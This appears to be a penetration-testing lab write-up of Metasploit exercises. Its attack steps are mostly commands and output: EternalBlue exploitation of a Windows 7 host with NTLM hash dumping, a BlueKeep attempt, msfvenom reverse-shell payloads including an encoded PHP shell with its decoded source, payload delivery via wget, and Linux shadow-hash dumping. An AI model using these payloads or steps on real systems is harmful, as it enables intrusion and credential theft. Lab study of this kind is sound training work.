[*] Nmap: Not shown: 991 closed ports
[*] Nmap: PORT      STATE SERVICE      VERSION
[*] Nmap: 135/tcp   open  msrpc        Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: 3389/tcp  open  tcpwrapped
[*] Nmap: 49152/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49158/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49159/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: MAC Address: 02:CC:CE:72:36:1F (Unknown)
[*] Nmap: Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 72.38 seconds
msf6 > hosts

Hosts
=====

address       mac                name                                        os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----                                        -------  ---------  -----  -------  ----  --------
10.10.120.17  02:cc:ce:72:36:1f  ip-10-10-120-17.eu-west-1.compute.internal  Unknown                    device

msf6 > services
Services
========

host          port   proto  name          state  info
----          ----   -----  ----          -----  ----
10.10.120.17  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.120.17  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.120.17  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.120.17  3389   tcp    tcpwrapped    open
10.10.120.17  49152  tcp    msrpc         open   Microsoft Windows RPC
10.10.120.17  49153  tcp    msrpc         open   Microsoft Windows RPC
10.10.120.17  49154  tcp    msrpc         open   Microsoft Windows RPC
10.10.120.17  49158  tcp    msrpc         open   Microsoft Windows RPC
10.10.120.17  49159  tcp    msrpc         open   Microsoft Windows RPC

msf6 > 

```

**Open Ports and Services:**

1. **135/tcp - MSRPC (Microsoft Remote Procedure Call)**
    - Used for inter-process communication in Windows environments.
    - Often leveraged by Windows services and applications for remote management.
2. **139/tcp - NetBIOS Session Service (netbios-ssn)**
    - Legacy protocol for file/printer sharing and network communication in Windows.
    - Part of the SMB (Server Message Block) suite.
    - Can reveal hostname (in this case: **`JON-PC`**) and workgroup (**`WORKGROUP`**).
3. **445/tcp - Microsoft-DS (SMB over TCP)**
    - Modern version of SMB for file/printer sharing, Active Directory, and other services.
    - The OS is likely **Windows 7 to Windows 10** (as per the banner).
    - A common target for exploits (e.g., EternalBlue, brute-forcing).
4. **3389/tcp - tcpwrapped (RDP - Remote Desktop Protocol)**
    - Indicates RDP is listening but may be filtered/restricted.
    - Windows Remote Desktop, used for graphical remote administration.
5. **49152-49159/tcp - MSRPC (High Ports - Dynamic RPC)**
    - Windows uses these ephemeral ports for additional RPC services.
    - Common in modern Windows systems for DCOM and other features.

Key Observation: 

- **OS Detection**: The target is likely a **Windows 7/10** machine (based on SMB banner).
- **Hostname**: **`JON-PC`** (revealed via NetBIOS/SMB).
- **Workgroup**: **`WORKGROUP`** (default workgroup name, suggesting a standalone machine or home network).

### SMB Exploitation

```bash
# To sccan for smb version
scanner/smb/smb_version

# smb login
auxiliary/scanner/smb/smb_login

# scan target if the target vulnerable to ms17_010
auxiliary/scanner/smb/smb_ms17_010
```

Checking if the target is vulnerable to MS17-010:  A vulnerability scanner that checks if a target Windows system is vulnerable to the **EternalBlue** exploit (MS17-010),  a critical flaw in Microsoft's **SMBv1** protocol that allows **remote code execution (RCE)**.

```bash
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
[+] 10.10.120.17:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.120.17:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

The target is vulnerable to **EternalBlue.** Search for the EternalBlue module to exploit

```bash
msf6 auxiliary(scanner/smb/smb_ms17_010) > search eternalblue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .
```

use `exploit/windows/smb/ms17_010_eternalblue`  and set the required parameter, then run the exploit.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set target 1
target => 1
msf6 exploit(windows/smb/ms17_010_eternalblue) > show 
[-] Argument required

[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
msf6 exploit(windows/smb/ms17_010_eternalblue) > show targets 

Exploit targets:
=================

    Id  Name
    --  ----
    0   Automatic Target
=>  1   Windows 7
    2   Windows Embedded Standard 7
    3   Windows Server 2008 R2
    4   Windows 8
    5   Windows 8.1
    6   Windows Server 2012
    7   Windows 10 Pro
    8   Windows 10 Enterprise Evaluation

msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.169.241:4444 
[*] 10.10.120.17:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.120.17:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.120.17:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.120.17:445 - The target is vulnerable.
[*] 10.10.120.17:445 - Connecting to target for exploitation.
[+] 10.10.120.17:445 - Connection established for exploitation.
[+] 10.10.120.17:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.120.17:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.120.17:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.120.17:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.120.17:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.120.17:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.120.17:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.120.17:445 - Sending all but last fragment of exploit packet
[*] 10.10.120.17:445 - Starting non-paged pool grooming
[+] 10.10.120.17:445 - Sending SMBv2 buffers
[+] 10.10.120.17:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.120.17:445 - Sending final SMBv2 buffers.
[*] 10.10.120.17:445 - Sending last fragment of exploit packet!
[*] 10.10.120.17:445 - Receiving response from exploit packet
[+] 10.10.120.17:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.120.17:445 - Sending egg to corrupted connection.
[*] 10.10.120.17:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.10.120.17
[*] Meterpreter session 1 opened (10.10.169.241:4444 -> 10.10.120.17:49230) at 2025-08-06 19:36:40 +0100
[+] 10.10.120.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.120.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.120.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > pwd
C:\Windows\system32
meterpreter > search -f flag.txt
Found 1 result...
=================

Path                             Size (bytes)  Modified (UTC)
----                             ------------  --------------
c:\Users\Jon\Documents\flag.txt  15            2021-07-15 03:39:25 +0100

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::
meterpreter > 

```

### RDP Exploitation

Test if the target is vulnerable to‣.

This step is optional, but I attempted to run the BlueKeep exploit, and it worked; however, there was no session.

```bash
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > run
[+] 10.10.120.17:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 10.10.120.17:3389     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run
[*] Started reverse TCP handler on 10.10.169.241:4444 
[*] 10.10.120.17:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 10.10.120.17:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 10.10.120.17:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 10.10.120.17:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.120.17:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 10.10.120.17:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8013200000, Channel count 1.
[!] 10.10.120.17:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.10.120.17:3389 - Surfing channels ...
[*] 10.10.120.17:3389 - Lobbing eggs ...
[*] 10.10.120.17:3389 - Forcing the USE of FREE'd object ...
[!] 10.10.120.17:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.

```

## Msfvenom

**Msfvenom** is a powerful **payload generator** and **encoder** tool that comes with the **Metasploit Framework**. It combines the functionalities of the older **`msfpayload`** and **`msfencode`** tools into a single command-line utility.

**Key Features of Msfvenom**

1. **Payload Generation**
    - Creates standalone malicious executables (e.g., **`.exe`**, **`.apk`**, **`.elf`**, **`.php`**) for exploits.
    - Supports **reverse shells**, **bind shells**, **Meterpreter**, and other payloads.
2. **Encoding & Obfuscation**
    - Helps evade **antivirus (AV)** detection by encoding payloads (e.g., using **`shikata_ga_nai`**).
    - Can chain multiple encodings for better stealth.
3. **Output Formats**
    - Can generate payloads in various formats (raw, executable, Python, Ruby, PowerShell, etc.).
4. **Integration with Metasploit**
    - Generated payloads can be easily used with **Metasploit’s `multi/handler`** for exploitation

### **Payloads**

```bash
root@ip-10-10-169-241:~# msfvenom -l payloads | grep "reverse" | head
    aix/ppc/shell_reverse_tcp                                          Connect back to attacker and spawn a command shell
    android/meterpreter/reverse_http                                   Run a meterpreter server in Android. Tunnel communication over HTTP
    android/meterpreter/reverse_https                                  Run a meterpreter server in Android. Tunnel communication over HTTPS
    android/meterpreter/reverse_tcp                                    Run a meterpreter server in Android. Connect back stager
    android/meterpreter_reverse_http                                   Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_https                                  Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_tcp                                    Connect back to the attacker and spawn a Meterpreter shell
    android/shell/reverse_http                                         Spawn a piped command shell (sh). Tunnel communication over HTTP
    android/shell/reverse_https                                        Spawn a piped command shell (sh). Tunnel communication over HTTPS
    android/shell/reverse_tcp                                          Spawn a piped command shell (sh). Connect back stager

```

### **Formats**

```bash
root@ip-10-10-169-241:~# msfvenom -l format

Framework Executable Formats [--format <value>]
===============================================

    Name
    ----
    asp
    aspx
    aspx-exe
    axis2
    dll
    ducky-script-psh
    elf
    elf-so
    exe
    exe-only
    exe-service
    exe-small
    hta-psh
    jar
    jsp
    loop-vbs
    macho
    msi
    msi-nouac
    osx-app
    psh
    psh-cmd
    psh-net
    psh-reflection
    python-reflection
    vba
    vba-exe
    vba-psh
    vbs
    war

Framework Transform Formats [--format <value>]
==============================================

    Name
    ----
    base32
    base64
    bash
    c
    csharp
    dw
    dword
    go
    golang
    hex
    java
    js_be
    js_le
    masm
    nim
    nimlang
    num
    octal
    perl
    pl
    powershell
    ps1
    py
    python
    raw
    rb
    ruby
    rust
    rustlang
    sh
    vbapplication
    vbscript
    zig

root@ip-10-10-169-241:~# 
```

**Encoders**

```bash
root@ip-10-10-169-241:~# msfvenom -l encoders

Framework Encoders [--encoder <value>]
======================================

    Name                          Rank       Description
    ----                          ----       -----------
    cmd/base64                    good       Base64 Command Encoder
    cmd/brace                     low        Bash Brace Expansion Command Encoder
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    php/hex                       great      PHP Hex Encoder
    php/minify                    great      PHP Minify Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    ruby/base64                   great      Ruby Base64 Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
    x64/xor_dynamic               normal     Dynamic key XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
    x86/xor_dynamic               normal     Dynamic key XOR Encoder
    x86/xor_poly                  normal     XOR POLY Encoder

root@ip-10-10-169-241:~# 

```

**Example:**

```bash
root@ip-10-10-169-241:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.169.241 -f raw -e php/base64
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of php/base64
php/base64 succeeded with size 1511 (iteration=0)
php/base64 chosen with final size 1511
Payload size: 1511 bytes
eval(base64_decode('Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjE2OS4yNDEnOyAkcG9ydCA9IDQ0NDQ7IGlmICgoJGYgPSAnc3RyZWFtX3NvY2tldF9jbGllbnQnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigidGNwOi8veyRpcH06eyRwb3J0fSIpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnZnNvY2tvcGVuJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoJGlwLCAkcG9ydCk7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdzb2NrZXRfY3JlYXRlJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOyAkcmVzID0gQHNvY2tldF9jb25uZWN0KCRzLCAkaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzX3R5cGUgPSAnc29ja2V0JzsgfSBpZiAoISRzX3R5cGUpIHsgZGllKCdubyBzb2NrZXQgZnVuY3MnKTsgfSBpZiAoISRzKSB7IGRpZSgnbm8gc29ja2V0Jyk7IH0gc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsgfSBpZiAoISRsZW4pIHsgZGllKCk7IH0gJGEgPSB1bnBhY2so.Ik5sZW4iLCAkbGVuKTsgJGxlbiA9ICRhWydsZW4nXTsgJGIgPSAnJzsgd2hpbGUgKHN0cmxlbigkYikgPCAkbGVuKSB7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRiIC49IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgfSB9ICRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsgJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsgaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ3N1aG9zaW4nKSAmJiBpbmlfZ2V0KCdzdWhvc2luLmV4ZWN1dG9yLmRpc2FibGVfZXZhbCcpKSB7ICRzdWhvc2luX2J5cGFzcz1jcmVhdGVfZnVuY3Rpb24oJycsICRiKTsgJHN1aG9zaW5fYnlwYXNzKCk7IH0gZWxzZSB7IGV2YWwoJGIpOyB9IGRpZSgpOw'));

root@ip-10-10-169-241:~# cat test.txt | base64 -d
/*<?php /**/ error_reporting(0); $ip = '10.10.169.241'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(base64: invalid input

```

### Example: Using msfvenom

1. **Create a payload**

```php
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.71.78 LPORT=4444 -f elf > shell.elf

```

1. **Launch msfconsole:** Use the handler module to listen for incoming connections. This module is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside of the framework. 

```bash
msf6 > use exploit/multi/handler 

# set the listening host
msf6 exploit(multi/handler) > set LHOST 10.10.71.78
LHOST => 10.10.71.78

# set the payload you created with msfvenom 
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options 

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.71.78      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.71.78:4444 

```

1. **Transfer payload to the target:** Once our handler starts listening, transfer your payload to the target. You can start a Python server to transfer it as shown below: 

- **Note**: If you want to dump hashes of the target, you need to run your payload as a root on the target machine. In this scenario, privilege escalation is unnecessary since the target has full `sudo` right. Simply typing `sudo -i` will grant root access.

On the Attacker machine

```php
python3 -m http.server 8888
```

On the target machine.

```bash
$ sudo -i
root@ip-10-10-16-129:~# wget http://10.10.71.78:8888/shell.elf
root@ip-10-10-16-129:~# ls -l
total 8
-rw-r--r-- 1 root root  207 Aug  6 21:14 shell.elf
drwxr-xr-x 4 root root 4096 Apr 26 23:21 snap
root@ip-10-10-16-129:~# chmod +x shell.elf 
```

![image.png](attachment:c7892538-a287-4216-bcb1-0c826068b758:image.png)

Our payload is executed with root privileges, and we can start reading `/etc/shadow` file to get the user’s hashes. This can be done with a post module →`linux/gather/hashdump`

1. **Hashdump**

```bash
msf6 exploit(multi/handler) > search type:post linux
msf6 exploit(multi/handler) > use 27
msf6 post(linux/gather/hashdump) > show options 

Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on

View the full module info with the info, or info -d command.
msf6 exploit(multi/handler) > use post/linux/gather/hashdump
msf6 post(linux/gather/hashdump) > sessions 

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  4         meterpreter x86/linux  root @ ip-10-10-16-129.eu-west-1.compute.inte  10.10.71.78:4444 -> 10.10.16.129:38050 (10.10
                                   rnal                                           .16.129)
msf6 post(linux/gather/hashdump) > set session 4
session => 4
msf6 post(linux/gather/hashdump) > run
[+] murphy:$6$qK0Kt4UO$HuCrlOJGbBJb5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHhPHeI2JU3m9OBOS7lUKkKMADLxCBcywzIxl7b.:1001:1001::/home/murphy:/bin/sh
[+] claire:$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002:1002::/home/claire:/bin/sh
[+] Unshadowed Password File: /root/.msf4/loot/20250806224812_default_10.10.16.129_linux.hashes_511776.txt
[*] Post module execution completed

```
